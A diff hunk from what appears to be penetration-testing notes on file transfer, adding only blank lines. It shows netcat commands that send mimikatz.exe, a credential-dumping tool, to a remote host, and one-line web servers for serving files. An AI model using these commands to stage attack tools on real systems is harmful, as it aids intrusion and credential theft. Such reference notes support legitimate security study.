@@ -149,15 +149,20 @@ https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md
 ## netcat
 
 nc -nlvp 8000 > mimi_incoming.exe
+
 nc -nv 10.10.10.10 8000 </tmp/mimikatz.exe
 
 
 ## web browser / server
 
 python -m SimpleHTTPServer 80
+
 python3 -m http.server
+
 ruby -run -ehttpd . -p80
+
 php -S 0.0.0.0:80
+
 socat TCP-LISTEN:80,reuseaddr,fork
 
 
